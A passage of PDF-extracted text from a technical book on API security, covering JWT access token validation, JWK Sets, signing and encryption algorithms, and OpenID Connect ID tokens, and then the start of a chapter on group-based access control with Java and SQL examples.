An alternative is to use a self-contained token format such as JWTs that were covered in chapter 6. This allows the API to validate the access token locally without needing to make an HTTPS call to the AS. While there is not yet a standard for JWT-based OAuth2 access tokens  although one is being developed; see http:  mng.bz 5pW4 , it’s common for an AS to support this as an option.   To validate a JWT-based access token, the API needs to first authenticate the JWT using a cryptographic key. In chapter 6, you used symmetric HMAC or authenticated encryption algorithms in which the same key is used to both create and verify mes- sages. This means that any party that can verify a JWT is also able to create one that will be trusted by all other parties. Although this is suitable when the API and AS exist   250  CHAPTER 7 OAuth2 and OpenID Connect  within the same trust boundary, it becomes a security risk when the APIs are in differ- ent trust boundaries. For example, if the AS is in a different datacenter to the API, the key must now be shared between those two datacenters. If there are many APIs that need access to the shared key, then the security risk increases even further because an attacker that compromises any API can then create access tokens that will be accepted by all of them.   To avoid these problems, the AS can switch to public key cryptography using digi- tal signatures, as shown in figure 7.8. Rather than having a single shared key, the AS instead has a pair of keys: a private key and a public key. The AS can sign a JWT using the private key, and then anybody with the public key can verify that the signature is genuine. However, the public key cannot be used to create a new signature and so it’s safe to share the public key with any API that needs to validate access tokens. For this reason, public key cryptography is also known as asymmetric cryptography, because the holder of a private key can perform different operations to the holder of a public key. Given that only the AS needs to create new access tokens, using public key cryptogra- phy  for  JWTs  enforces  the  principle  of  least  authority   POLA;  see  chapter  2   as  it ensures that APIs can only verify access tokens and not create new ones.  TIP Although public key cryptography is more secure in this sense, it’s also more  complicated  with  more  ways  to  fail.  Digital  signatures  are  also  much slower than HMAC and other symmetric algorithms—typically 10–100x slower for equivalent security.   The AS signs a JWT-based access token using its private key.  Private key  Authorization server  Client  JWT  JWT  Public key  API  The private key is never shared.  The API can verify the JWT using the public key it retrieves from the AS.  Figure 7.8 When using JWT-based access tokens, the AS signs the JWT using a private  key that is known only to the AS. The API can retrieve a corresponding public key from  the AS to verify that the JWT is genuine. The public key cannot be used to create a new  JWT, ensuring that access tokens can be issued only by the AS.   Validating an access token  251  RETRIEVING THE PUBLIC KEY The API can be directly configured with the public key of the AS. For example, you could create a keystore that contains the public key, which the API can read when it first starts up. Although this will work, it has some disadvantages:   A  Java  keystore  can  only  contain  certificates,  not  raw  public  keys,  so  the  AS would need to create a self-signed certificate purely to allow the public key to be imported into the keystore. This adds complexity that would not otherwise be required.   If the AS changes its public key, which is recommended, then the keystore will need to be manually updated to list the new public key and remove the old one. Because some access tokens using the old key may still be in use, the keystore may have to list both public keys until those old tokens expire. This means that two manual updates need to be performed: one to add the new public key, and a second update to remove the old public key when it’s no longer needed.  Although you could use X.509 certificate chains to establish trust in a key via a certifi- cate  authority,  just  as  for HTTPS  in  section  7.4.2,  this would  require  the certificate chain  to  be  attached  to  each  access  token  JWT   using  the  standard  x5c  header described in chapter 6 . This would increase the size of the access token beyond rea- sonable limits—a certificate chain can be several kilobytes in size. Instead, a common solution is for the AS to publish its public key in a JSON document known as a JWK Set  https:  tools.ietf.org html rfc7517 . An example JWK Set is shown in listing 7.10 and consists of a JSON object with a single keys attribute, whose value is an array of JSON Web Keys  see chapter 6 . The API can periodically fetch the JWK Set from an HTTPS URI provided by the AS. The API can trust the public keys in the JWK Set because they were retrieved over HTTPS from a trusted URI, and that HTTPS con- nection  was  authenticated  using  the  server  certificate  presented  during  the  TLS handshake.  An elliptic curve public key  Listing 7.10 An example JWK Set  The JWK Set has a “keys” attribute,  which is an array of JSON Web Keys.  {"keys": [              {       "kty": "EC",          "kid": "I4x IijvdDsUZMghwNq2gC 7pYQ=",       "use": "sig",       "x": "k5wSvW_6JhOuCj-9PdDWdEA4oH90RSmC2GTliiUHAhXj6rmTdE2S- ➥ _zGmMFxufuV",       "y": "XfbR-tRoVcZMCoUrkKtuZUIyfCgAy8b0FWnPZqevwpdoTzGQBOXSN ➥ i6uItN_o4tH",       "crv": "P-384",       "alg": "ES384"     },     {       "kty": "RSA",             "kid": "wU3ifIIaLOUAReRB FG6eM1P1QM=",       "use": "sig",  An RSA  public key   252  CHAPTER 7 OAuth2 and OpenID Connect        "n": "10iGQ5l5IdqBP1l5wb5BDBZpSyLs4y_Um-kGv_se0BkRkwMZavGD_Nqjq8x3- ➥ fKNI45nU7E7COAh8gjn6LCXfug57EQfi0gOgKhOhVcLmKqIEXPmqeagvMndsXWIy6k8WP ➥ PwBzSkN5PDLKBXKG_X1BwVvOE9276nrx6lJq3CgNbmiEihovNt_6g5pCxiSarIk2uaG3T ➥ 3Ve6hUJrM0W35QmqrNM9rL3laPgXtCuz4sJJN3rGnQq_25YbUawW9L1MTVbqKxWiyN5Wb ➥ XoWUg8to1DhoQnXzDymIMhFa45NTLhxtdH9CDprXWXWBaWzo8mIFes5yI4AJW4ZSg1PPO ➥ 2UJSQ",       "e": "AQAB",       "alg": "RS256"     } ]}  Many  JWT  libraries  have  built-in  support  for  retrieving  keys  from  a  JWK  Set  over HTTPS, including periodically refreshing them. For example, the Nimbus JWT library that  you  used  in  chapter  6  supports  retrieving  keys  from  a  JWK  Set  URI  using  the RemoteJWKSet class:  var jwkSetUri = URI.create "https:  as.example.com:8443 jwks_uri" ; var jwkSet = new RemoteJWKSet jwkSetUri ;  Listing 7.11 shows the configuration of a new SignedJwtAccessTokenStore that will validate an access token as a signed JWT. The constructor takes a URI for the end- point on the AS to retrieve the JWK Set from and constructs a RemoteJWKSet based on this. It also takes in the expected issuer and audience values of the JWT, and the JWS signature algorithm that will be used. As you’ll recall from chapter 6, there are attacks on JWT verification if the wrong algorithm is used, so you should always strictly vali- date that the algorithm header has an expected value. Open the src main java com  manning apisecurityinaction token  folder  and  create  a  new  file  SignedJwtAccess- TokenStore.java with the contents of listing 7.11. You’ll fill in the details of the read method shortly.  TIP If the AS supports discovery  see section 7.2.3 , then it may advertise its JWK Set URI as the jwks_uri field of the discovery document.

A  JWT  access  token  can  be  validated  by  configuring  the  processor  class  to  use  the RemoteJWKSet as the source for verification keys  ES256 is an example of a JWS signa- ture algorithm :      var verifier = new DefaultJWTProcessor   ;     var keySelector = new JWSVerificationKeySelector               JWSAlgorithm.ES256, jwkSet ;     verifier.setJWSKeySelector keySelector ;     var claims = verifier.process tokenId, null ;  After verifying the signature and the expiry time of the JWT, the processor returns the JWT  Claims  Set.  You  can  then  verify  that  the  other  claims  are  correct.  You  should check  that  the  JWT  was  issued  by  the  AS  by  validating  the  iss  claim,  and  that  the access token is meant for this API by ensuring that an identifier for the API appears in the audience  aud  claim  listing 7.12 .     In  the  normal  OAuth2  flow,  the  AS  is  not  informed  by  the  client  which  APIs  it intends to use the access token for,9 and so the audience claim can vary from one AS to another.

Another area of disagreement between AS software is in how the scope of the token is communicated. Some AS software produces a string scope claim, whereas others produce a JSON array of strings. Some others may use a different field entirely, such as scp or scopes. Listing 7.12 shows how to handle a scope claim that may either be a string or an array of strings.

Because public key signature algorithms are expensive and usually limited in the amount of data that can be signed, the con- tents of the JWT is first hashed using a cryptographic hash function and then the hash value  is  signed.  JWS  provides  variants  for  different  hash  functions  when  using  the   Validating an access token  255  Table 7.2 JWS signature algorithms  JWS Algorithm  Hash function  Signature algorithm  RS256  RS384  RS512  PS256  PS384  PS512  ES256  ES384  ES512  EdDSA  SHA-256  SHA-384  SHA-512  SHA-256  SHA-384  SHA-512  SHA-256  SHA-384  SHA-512  RSA with PKCS1 v1.5 padding  RSA with PSS padding  ECDSA with the NIST P-256 curve  ECDSA with the NIST P-384 curve  ECDSA with the NIST P-521 curve  SHA-512   SHAKE256  EdDSA with either the Ed25519 or Ed448 curves  same  underlying  signature  algorithm.  All  the  allowed  hash  functions  provide  ade- quate  security,  but  SHA-512  is  the  most  secure  and  may  be  slightly  faster  than  the other choices on 64-bit systems. The exception to this rule is when using ECDSA sig- natures, because JWS specifies elliptic curves to use along with each hash function; the curve used with SHA-512 has a significant performance penalty compared with the curve used for SHA-256.   Of these choices, the best is EdDSA, based on the Edwards Curve Digital Signature Algorithm   https:  tools.ietf.org html rfc8037 .  EdDSA  signatures  are  fast  to  pro- duce and verify, produce compact signatures, and are designed to be implemented securely  against  side-channel  attacks.  Not  all  JWT  libraries  or  AS  software  supports EdDSA signatures yet. The older ECDSA standard for elliptic curve digital signatures has wider support, and shares some of the same properties as EdDSA, but is slightly slower and harder to implement securely.   WARNING ECDSA signatures require a unique random nonce for each signa- ture. If a nonce is repeated, or even just a few bits are not completely random, then  the  private  key  can  be  reconstructed  from  the  signature  values.  This kind of bug was used to hack the Sony PlayStation 3, steal Bitcoin cryptocur- rency  from  wallets  on  Android  mobile  phones,  among  many  other  cases. Deterministic ECDSA signatures  https:  tools.ietf.org html rfc6979  can be used to prevent this, if your library supports them. EdDSA signatures are also immune to this issue.  RSA  signatures  are  expensive  to  produce,  especially  for  secure  key  sizes   a  3072-bit RSA key is roughly equivalent to a 256-bit elliptic curve key or a 128-bit HMAC key  and produce much larger signatures than the other options, resulting in larger JWTs.   256  CHAPTER 7 OAuth2 and OpenID Connect  On the other hand, RSA signatures can be validated very quickly. The variants of RSA using PSS padding should be preferred over those using the older PKCS1 version 1.5 padding but may not be supported by all libraries.  7.4.5  Encrypted JWT access tokens  In chapter 6, you learned that authenticated encryption can be used to provide the benefits  of  encryption  to  hide  confidential  attributes  and  authentication  to  ensure that a JWT is genuine and has not been tampered with. Encrypted JWTs can be useful for  access  tokens  too,  because  the  AS  may  want  to  include  attributes  in  the  access token  that  are  useful  for  the  API  for  making  access  control  decisions,  but  which should be kept confidential from third-party clients or from the user themselves. For example, the AS may include the resource owner’s email address in the token for use by the API, but this information should not be leaked to the third-party client. In this case the AS can encrypt the access token JWT by using an encryption key that only the API can decrypt.    Unfortunately,  none  of  the  public  key  encryption  algorithms  supported  by  the JWT  standards  provide  authenticated  encryption,10  because  this  is  less  often  imple- mented  for  public  key  cryptography.  The  supported  algorithms  provide  only  confi- dentiality and so must be combined with a digital signature to ensure the JWT is not tampered with or forged. This is done by first signing the claims to produce a signed JWT, and then encrypting that signed JWT to produce a nested JOSE structure  fig- ure 7.9 . The downside is that the resulting JWT is much larger than it would be if it was just signed and requires two expensive public key operations to first decrypt the outer encrypted JWE and then verify the inner signed JWT. You shouldn’t use the same key for encryption and signing, even if the algorithms are compatible.   The JWE specifications include several public key encryption algorithms, shown in table 7.3. The details of the algorithms can be complicated, and several variations are included. If your software supports it, it’s best to avoid the RSA encryption algorithms entirely and opt for ECDH-ES encryption. ECDH-ES is based on Elliptic Curve Diffie- Hellman key agreement, and is a secure and performant choice, especially when used with  the  X25519  or  X448  elliptic  curves   https:  tools.ietf.org html rfc8037 ,  but these are not yet widely supported by JWT libraries.         10  I have proposed adding public key authenticated encryption to JOSE and JWT, but the proposal is still a draft at this stage.

Figure 7.9 When using public key cryptography, a JWT needs to be first signed and then  encrypted to ensure confidentiality and integrity as no standard algorithm provides both  properties. You should use separate keys for signing and encryption even if the algorithms  are compatible.

OAEP is secure but RSA decryption  is slow, and encryption produces  large JWTs.  A secure encryption algorithm but  the epk header it adds can be bulky.  Best when used with the X25519 or  X448 curves.  WARNING Most of the JWE algorithms are secure, apart from RSA1_5 which uses  the  older  PKCS1  version  1.5  padding  algorithm.  There  are  known attacks against this algorithm, so you should not use it. This padding mode was  replaced  by  Optimal  Asymmetric  Encryption  Padding   OAEP   that  was   258  CHAPTER 7 OAuth2 and OpenID Connect  standardized in version 2 of PKCS1. OAEP uses a hash function internally, so there are two variants included in JWE: one using SHA-1, and one using SHA- 256.  Because  SHA-1  is  no  longer  considered  secure,  you  should  prefer  the SHA-256 variant, although there are no known attacks against it when used with OAEP. However, even OAEP has some downsides because it’s a compli- cated  algorithm  and  less  widely  implemented.  RSA  encryption  also  pro- duces larger ciphertext than other modes and the decryption operation is very  slow,  which  is  a  problem  for  an  access  token  that  may  need  to  be decrypted many times.  7.4.6  Letting the AS decrypt the tokens  An  alternative  to  using  public  key  signing  and  encryption  would  be  for  the  AS  to encrypt access tokens with a symmetric authenticated encryption algorithm, such as the ones you learned about in chapter 6. Rather than sharing this symmetric key with every  API,  they  instead  call  the  token  introspection  endpoint  to  validate  the  token rather than verifying it locally. Because the AS does not need to perform a database lookup to validate the token, it may be easier to horizontally scale the AS in this case by adding more servers to handle increased traffic.    This pattern allows the format of access tokens to change over time because only the AS validates tokens. In software engineering terms, the choice of token format is encapsulated  by  the  AS  and  hidden  from  resource  servers,  while  with  public  key signed JWTs, each API knows how to validate tokens, making it much harder to change the representation later. More sophisticated patterns for managing access tokens for microservice environments are covered in part 4.  Pop quiz 8 Which key is used to validate a public key signature?  a The public key b The private key  The answer is at the end of the chapter.  7.5  Single sign-on One of the advantages of OAuth2 is the ability to centralize authentication of users at the AS, providing a single sign-on  SSO  experience  figure 7.10 . When the user’s cli- ent needs to access an API, it redirects the user to the AS authorization endpoint to get an access token. At this point the AS authenticates the user and asks for consent for the client to be allowed access. Because this happens within a web browser, the AS typically creates a session cookie, so that the user does not have to login again.   If the user then starts using a different client, such as a different web application, they will be redirected to the AS again. But this time the AS will see the existing session   Single sign-on  259  Clients can delegate to the AS to authenticate the user and manage tokens.  Web browser client  API  API  API  Authenticate  Authorization server  Token introspection  Token introspection  Mobile app client  API  API  API  If the user has an existing session with the AS, then they don’t need to log in again to approve a new access token.  APIs can all call a single endpoint on the AS to validate access tokens.  Figure 7.10 OAuth2 enables single sign-on for users. As clients delegate to the  AS to get access tokens, the AS is responsible for authenticating all users. If the  user has an existing session with the AS, then they don’t need to be authenticated  again, providing a seamless SSO experience.  cookie and won’t prompt the user to log in. This even works for mobile apps from dif- ferent developers if they are installed on the same device and use the system browser for OAuth flows, as recommended in section 7.3. The AS may also remember which scopes a user has granted to clients, allowing the consent screen to be skipped when a user returns to that client. In this way, OAuth can provide a seamless SSO experience for users replacing traditional SSO solutions. When the user logs out, the client can revoke  their  access  or  refresh  token  using  the  OAuth  token  revocation  endpoint, which will prevent further access.  WARNING Though it might be tempting to reuse a single access token to pro- vide access to many different APIs within an organization, this increases the risk if a token is ever stolen. Prefer to use separate access tokens for each dif- ferent API.   260  7.6  CHAPTER 7 OAuth2 and OpenID Connect  OpenID Connect OAuth  can  provide  basic  SSO  functionality,  but  the  primary  focus  is  on  delegated third-party access to APIs rather than user identity or session management. The OpenID Connect  OIDC  suite of standards  https:  openid.net developers specs   extend OAuth2 with several features:   A standard way to retrieve identity information about a user, such as their name, email address, postal address, and telephone number. The client can access a UserInfo endpoint to retrieve identity claims as JSON using  an  OAuth2 access token with standard OIDC scopes.   A way for the client to request that the user is authenticated even if they have an existing  session,  and  to  ask  for  them  to  be  authenticated  in  a  particular  way, such as with two-factor authentication. While obtaining an OAuth2 access token may involve user authentication, it’s not guaranteed that the user was even pres- ent when the token was issued or how recently they logged in. OAuth2 is primar- ily  a  delegated  access  protocol,  whereas  OIDC  provides  a  full  authentication protocol. If the client needs to positively authenticate a user, then OIDC should be used.   Extensions for session management and logout, allowing clients to be notified when a user logs out of their session at the AS, enabling the user to log out of all clients at once  known as single logout .  Although OIDC is an extension of OAuth, it rearranges the pieces a bit because the API that the client wants to access  the UserInfo endpoint  is part of the AS itself  fig- ure 7.11 . In a normal OAuth2 flow, the client would first talk to the AS to obtain an access token and then talk to the API on a separate resource server.   DEFINITION In OIDC, the AS and RS are combined into a single entity known as an OpenID Provider  OP . The client is known as a Relying Party  RP .  The most common use of OIDC is for a website or app to delegate authentication to a third-party identity provider. If you’ve ever logged into a website using your Google or Facebook account, you’re using OIDC behind the scenes, and many large social media companies now support this.  7.6.1  ID tokens If you follow the OAuth2 recommendations in this chapter, then finding out who a user is involves three roundtrips to the AS for the client:  1 First, the client needs to call the authorization endpoint to get an authorization  code.  2 Then the client exchanges the code for an access token. 3 Finally,  the  client  can  use  the  access  token  to  call  the  UserInfo  endpoint  to  retrieve the identity claims for the user.   OpenID Connect  261  Client  API  In normal OAuth, there are three entities involved.  Authorization server  Client  In OpenID Connect, the client is accessing the UserInfo endpoint on the AS itself.  Authorization server  UserInfo API  Figure 7.11 In OpenID Connect, the client accesses APIs on the AS itself,  so there are only two entities involved compared to the three in normal OAuth.  The client is known as the Relying Party  RP , while the combined AS and API  is known as an OpenID Provider  OP .  This is a lot of overhead before you even know the user’s name, so OIDC provides a way to return some of the identity and authentication claims about a user as a new type of token known as an ID token, which is a signed and optionally encrypted JWT. This  token  can  be  returned  directly  from  the  token  endpoint  in  step  2,  or  even directly from the authorization endpoint in step 1, in a variant of the implicit flow. There is also a hybrid flow in which the authorization endpoint returns an ID token directly  along  with  an  authorization  code  that  the  client  can  then  exchange  for  an access token.   DEFINITION An ID token is a signed and optionally encrypted JWT that con- tains identity and authentication claims about a user.  To validate an ID token, the client should first process the token as a JWT, decrypting it if necessary and verifying the signature. When a client registers with an OIDC pro- vider, it specifies the ID token signing and encryption algorithms it wants to use and can supply public keys to be used for encryption, so the client should ensure that the   262  CHAPTER 7 OAuth2 and OpenID Connect  received ID token uses these algorithms. The client should then verify the standard JWT  claims  in  the  ID  token,  such  as  the  expiry,  issuer,  and  audience  values  as described in chapter 6. OIDC defines several additional claims that should also be ver- ified, described in table 7.4.  Table 7.4 ID token standard claims  Claim  Purpose  azp  Authorized Party  auth_time  User authentication time  nonce  Anti-replay nonce  Notes  An ID token can be shared with more than one party and so  have multiple values in the audience claim. The azp claim  lists the client the ID token was initially issued to. A client  directly interacting with an OIDC provider should verify that  it’s the authorized party if more than one party is in the  audience.  The time at which the user was authenticated as seconds  from the UNIX epoch.  A unique random value that the client sends in the authen- tication request. The client should verify that the same  value is included in the ID token to prevent replay attacks— see section 7.6.2 for details.  acr  amr  Authentication context  Class Reference  Indicates the overall strength of the user authentication  performed. This is a string and specific values are defined  by the OP or by other standards.  Authentication Methods  References  An array of strings indicating the specific methods used.  For example, it might contain ["password", "otp"] to  indicate that the user supplied a password and a one-time  password.  When requesting authentication, the client can use extra parameters to the authoriza- tion  endpoint  to  indicate  how  the  user  should  be  authenticated.  For  example,  the max_time parameter can be used to indicate how recently the user must have authen- ticated to be allowed to reuse an existing login session at the OP, and the acr_values parameter can be used to indicate acceptable authentication levels of assurance. The prompt=login parameter can be used to force reauthentication even if the user has an existing session that would satisfy any other constraints specified in the authentication request,  while  prompt=none  can  be  used  to  check  if  the  user  is  currently  logged  in without authenticating them if they are not.  WARNING Just because a client requested that a user be authenticated in a certain way does not mean that they will be. Because the request parameters are exposed as URL query parameters in a redirect, the user could alter them to remove some constraints. The OP may not be able to satisfy all requests for other reasons. The client should always check the claims in an ID token to make sure that any constraints were satisfied.   7.6.2 Hardening OIDC  OpenID Connect  263  While  an  ID  token  is  protected  against  tampering  by  the  cryptographic  signature, there are still several possible attacks when an ID token is passed back to the client in the URL from the authorization endpoint in either the implicit or hybrid flows:   The ID token might be stolen by a malicious script running in the same browser, or it might leak in server access logs or the HTTP Referer header. Although an ID token does not grant access to any API, it may contain personal or sensitive information about the user that should be protected.   An  attacker  may  be  able  to  capture  an  ID  token  from  a  legitimate  login attempt and then replay it later to attempt to login as a different user. A cryp- tographic signature guarantees only that the ID token was issued by the cor- rect OP but does not by itself guarantee that it was issued in response to this specific request.  The simplest defense against these attacks is to use the authorization code flow with PKCE as recommended for all OAuth2 flows. In this case the ID token is only issued by the OP from the token endpoint in response to a direct HTTPS request from the client. If you decide to use a hybrid flow to receive an ID token directly in the redirect back from the authorization endpoint, then OIDC includes several protections that can be employed to harden the flow:   The client can include a random nonce parameter in the request and verify that the same nonce is included in the ID token that is received in response. This prevents replay attacks as the nonce in a replayed ID token will not match the fresh value sent in the new request. The nonce should be randomly generated and  stored on the client just like the  OAuth  state parameter and the PKCE code_challenge.  Note that the nonce parameter is unrelated to a nonce used in encryption as covered in chapter 6.    The client can request that the ID token is encrypted using a public key sup- plied during registration or using AES encryption with a key derived from the client secret. This prevents sensitive personal information being exposed if the ID token is intercepted. Encryption alone does not prevent replay attacks, so an OIDC nonce should still be used in this case.   The  ID  token  can  include  c_hash  and  at_hash  claims  that  contain  crypto- graphic  hashes  of  the  authorization  code  and  access  token  associated  with  a request.  The  client  can  compare  these  to  the  actual  authorization  code  and access token it receives to make sure that they match. Together with the nonce and cryptographic signature, this effectively prevents an attacker swapping the authorization code or access token in the redirect URL when using the hybrid or implicit flows.  TIP You  can  use  the  same  random  value  for  the  OAuth  state  and  OIDC nonce parameters to avoid having to generate and store both on the client.   264  CHAPTER 7 OAuth2 and OpenID Connect  7.6.3  The additional protections provided by OIDC can mitigate many of the problems with the implicit grant. But they come at a cost of increased complexity compared with the authorization  code  grant  with  PKCE,  because  the  client  must  perform  several  com- plex cryptographic operations and check many details of the ID token during valida- tion. With the auth code flow and PKCE, the checks are performed by the OP when the code is exchanged for access and ID tokens.  Passing an ID token to an API Given that an ID token is a JWT and is intended to authenticate a user, it’s tempting to use them for authenticating users to your API. This can be a convenient pattern for first-party  clients,  because  the  ID  token  can  be  used  directly  as  a  stateless  session token. For example, the Natter web UI could use OIDC to authenticate a user and then store the ID token as a cookie or in local storage. The Natter API would then be configured to accept the ID token as a JWT, verifying it with the public key from the OP. An ID token is not appropriate as a replacement for access tokens when dealing with third-party clients for the following reasons:   ID tokens are not scoped, and the user is asked only for consent for the client to access  their  identity  information.  If  the  ID  token  can  be  used  to  access  APIs then  any  client  with  an  ID  token  can  act  as  if  they  are  the  user  without  any restrictions.   An ID token authenticates a user to the client and is not intended to be used by that client to access an API. For example, imagine if Google allowed access to its APIs based on an ID token. In that case, any website that allowed its users to log in with their Google account  using OIDC  would then be able to replay the ID token back to Google’s own APIs to access the user’s data without their consent.  To prevent these kinds of attacks, an ID token has an audience claim that only lists the client. An API should reject any JWT that does not list that API in the audience.   If you’re using the implicit or hybrid flows, then the ID token is exposed in the URL during the redirect back from the OP. When an ID token is used for access control, this has the same risks as including an access token in the URL as the token may leak or be stolen.  You should therefore not use ID tokens to grant access to an API.  NOTE Never  use  ID  tokens  for  access  control  for  third-party  clients.  Use access tokens for access and ID tokens for identity. ID tokens are like user- names; access tokens are like passwords.  Although you shouldn’t use an ID token to allow access to an API, you may need to look up identity information about a user while processing an API request or need to enforce  specific  authentication  requirements.  For  example,  an  API  for  initiating financial transactions may want assurance that the user has been freshly authenticated   OpenID Connect  265  using a strong authentication mechanism. Although this information can be returned from a token introspection request, this is not always supported by all authorization server  software.  OIDC  ID  tokens  provide  a  standard  token  format  to  verify  these requirements. In this case, you may want to let the client pass in a signed ID token that it has obtained from a trusted OP. When this is allowed, the API should accept the ID token only in addition to a normal access token and make all access control decisions based on the access token.    When the API needs to access claims in the ID token, it should first verify that it’s from a trusted OP by validating the signature and issuer claims. It should also ensure that  the  subject  of  the  ID  token  exactly  matches  the  resource  owner  of  the  access token  or  that  there is some other trust relationship between  them. Ideally,  the  API should then ensure that its own identifier is in the audience of the ID token and that the client’s identifier is the authorized party  azp claim , but not all OP software sup- ports setting these values correctly in this case. Listing 7.13 shows an example of vali- dating the claims in an ID token against those in an access token that has already been used to authenticate the request. Refer to the SignedJwtAccessToken store for details on configuring the JWT verifier.  Listing 7.13 Validating an ID token  var idToken = request.headers "X-ID-Token" ;     var claims = verifier.process idToken, null ;     Extract the ID token  from the request and  verify the signature.  if  !expectedIssuer.equals claims.getIssuer     {               throw new IllegalArgumentException                                  "invalid id token issuer" ;                     } if  !claims.getAudience  .contains expectedAudience   {         throw new IllegalArgumentException                                  "invalid id token audience" ;                   }  Ensure the token  is from a trusted  issuer and that this  API is the intended  audience.  var client = request.attribute "client_id" ;                   var azp = claims.getStringClaim "azp" ;                        if  client != null && azp != null && !azp.equals client   {        throw new IllegalArgumentException                                     "client is not authorized party" ;                 }  If the ID token has an  azp claim, then ensure  it’s for the same client  that is calling the API.  var subject = request.attribute "subject" ;        if  !subject.equals claims.getSubject     {            throw new IllegalArgumentException                         "subject does not match id token" ;    }  Check that the subject of  the ID token matches the  resource owner of the  access token.  request.attribute "id_token.claims", claims ;      Store the verified ID token  claims in the request attributes  for further processing.   266  CHAPTER 7 OAuth2 and OpenID Connect  Answers to pop quiz questions  1 d and e.

Summary   Scoped tokens allow clients to be given access to some parts of your API but not others, allowing users to delegate limited access to third-party apps and services.  The OAuth2 standard provides a framework for third-party clients to register  with your API and negotiate access with user consent.   All user-facing API clients should use the authorization code grant with PKCE to  obtain  access  tokens,  whether  they  are  traditional  web  apps,  SPAs,  mobile apps, or desktop apps. The implicit grant should no longer be used.   The standard token introspection endpoint can be used to validate an access token, or JWT-based access tokens can be used to reduce network roundtrips. Refresh tokens can be used to keep token lifetimes short without disrupting the user experience.   The OpenID Connect standard builds on top of OAuth2, providing a compre- hensive framework for offloading user authentication to a dedicated service. ID tokens can be used for user identification but should be avoided for access control.   Identity-based access control  This chapter covers  Organizing users into groups  Simplifying permissions with role-based access    Implementing more complex policies with   attribute-based access control   Centralizing policy management with a policy   control  engine  As Natter has grown, the number of access control list  ACL; chapter 3  entries has grown too. ACLs are simple, but as the number of users and objects that can be accessed through an API grows, the number of ACL entries grows along with them. If you have a million users and a million objects, then in the worst case you could end up with a billion ACL entries listing the individual permissions of each user for each object. Though that approach can work with fewer users, it becomes more of a problem as the user base grows. This problem is particularly bad if permissions are centrally managed by a system administrator  mandatory access control, or MAC, as discussed  in  chapter  7 ,  rather  than  determined  by  individual  users   discretionary access control, or DAC . If permissions are not removed when no longer required,  267   268  CHAPTER 8 Identity-based access control  users can end up accumulating privileges, violating the principle of least privilege. In this chapter you’ll learn about alternative ways of organizing permissions in the identity- based  access  control  model.  In  chapter  9,  we’ll  look  at  alternative  non-identity-based access control models.  DEFINITION Identity-based  access  control   IBAC   determines  what  you  can  do based on who you are. The user performing an API request is first authenti- cated and then a check is performed to see if that user is authorized to per- form the requested action.  8.1  Users and groups One  of  the  most  common  approaches  to  simplifying  permission  management  is  to collect related users into groups, as shown in figure 8.1. Rather than the subject of an access control decision always being an individual user, groups allow permissions to be assigned to collections of users. There is a many-to-many relationship between users and groups: a group can have many members, and a user can belong to many groups. If the membership of a group is defined in terms of subjects  which may be either users or other groups , then it is also possible to have groups be members of other groups, creating a hierarchical structure. For example, you might define a group for employees and another one for customers. If you then add a new group for project managers, you could add this group to the employees’ group: all project managers are employees.  A group can have many members, and a subject can be in many groups, so it is a many-to-many relationship.  Subject  r e b m e M  User  Group  A subject is either an individual user or a group.  The members of a group are subjects and so can themselves be other groups.  Figure 8.1 Groups are added as a new type of subject. Permissions can then  be assigned to individual users or to groups. A user can be a member of many  groups and each group can have many members.   Users and groups  269  The advantage of groups is that you can now assign permissions to groups and be sure that  all  members  of  that  group  have  consistent  permissions.  When  a  new  software engineer  joins  your  organization,  you  can  simply  add  them  to  the  “software  engi- neers” group rather than having to remember all the individual permissions that they need to get their job done. And when they change jobs, you simply remove them from that group and add them to a new one.  UNIX groups Another advantage of groups is that they can be used to compress the permissions associated with an object in some cases. For example, the UNIX file system stores permissions for each file as a simple triple of permissions for the current user, the user’s group, and anyone else. Rather than storing permissions for many individual users, the owner of the file can assign permissions to only a single pre-existing group, dramatically reducing the amount of data that must be stored for each file. The down- side of this compression is that if a group doesn’t exist with the required members, then the owner may have to grant access to a larger group than they would otherwise like to.  The implementation of simple groups is straightforward. Currently in the Natter API you have written, there is a users table and a permissions table that acts as an ACL linking users to permissions within a space. To add groups, you could first add a new table to indicate which users are members of which groups:  CREATE TABLE group_members      group_id VARCHAR 30  NOT NULL,     user_id VARCHAR 30  NOT NULL REFERENCES users user_id  ; CREATE INDEX group_member_user_idx ON group_members user_id ;  When the user authenticates, you can then look up the groups that user is a member of and add them as an additional request attribute that can be viewed by other pro- cesses.  Listing  8.1  shows  how  groups  could  be  looked  up  in  the  authenticate   method in UserController after the user has successfully authenticated.  Listing 8.1 Looking up groups during authentication      if  hash.isPresent   && SCryptUtil.check password, hash.get     {         request.attribute "subject", username ;  Set the user’s groups as a new attribute on the request.          var groups = database.findAll String.class,                        "SELECT DISTINCT group_id FROM group_members " +                       "WHERE user_id = ?", username ;                    request.attribute "groups", groups ;         }  Look up all  groups that the  user belongs to.  You can then either change the permissions table to allow either a user or group ID to be used  dropping the foreign key constraint to the users table :   270  CHAPTER 8 Identity-based access control  CREATE TABLE permissions      space_id INT NOT NULL REFERENCES spaces space_id ,     user_or_group_id VARCHAR 30  NOT NULL,          perms VARCHAR 3  NOT NULL ;  Allow either a  user or group ID.  or you can create two separate permission tables and define a view that performs a union of the two:  CREATE TABLE user_permissions … ; CREATE TABLE group_permissions … ; CREATE VIEW permissions space_id, user_or_group_id, perms  AS     SELECT space_id, user_id, perms FROM user_permissions     UNION ALL     SELECT space_id, group_id, perms FROM group permissions;  To determine if a user has appropriate permissions, you would query first for individ- ual user permissions and then for permissions associated with any groups the user is a member of. This can be accomplished in a single query, as shown in listing 8.2, which adjusts  the  requirePermission  method  in  UserController  to  take  groups  into account by building a dynamic SQL query that checks the permissions table for both the username from the subject attribute of the request and any groups the user is a member of. Dalesbred has support for safely constructing dynamic queries in its Query- Builder class, so you can use that here for simplicity.  TIP When building dynamic SQL queries, be sure to use only placeholders and never include user input directly in the query being built to avoid SQL injection attacks, which are discussed in chapter 2. Some databases support temporary tables, which allow you to insert dynamic values into the temporary table  and  then  perform  a  SQL  JOIN  against  the  temporary  table  in  your query. Each transaction sees its own copy of the temporary table, avoiding the need to generate dynamic queries.  Listing 8.2 Taking groups into account when looking up permissions  public Filter requirePermission String method, String permission  {     return  request, response  -> {         if  !method.equals request.requestMethod     {             return;         }          requireAuthentication request, response ;          var spaceId = Long.parseLong request.params ":spaceId"  ;         var username =  String  request.attribute "subject" ;         List  groups = request.attribute "groups" ;         Look up the  groups the  user is a  member of.  Build a dynamic query to check permissions for the user.          var queryBuilder = new QueryBuilder                                            "SELECT perms FROM permissions " +                                         "WHERE space_id = ? " +                                                "AND  user_or_group_id = ?", spaceId, username ;     Users and groups  271  Include any groups in the query.          for  var group : groups  {                           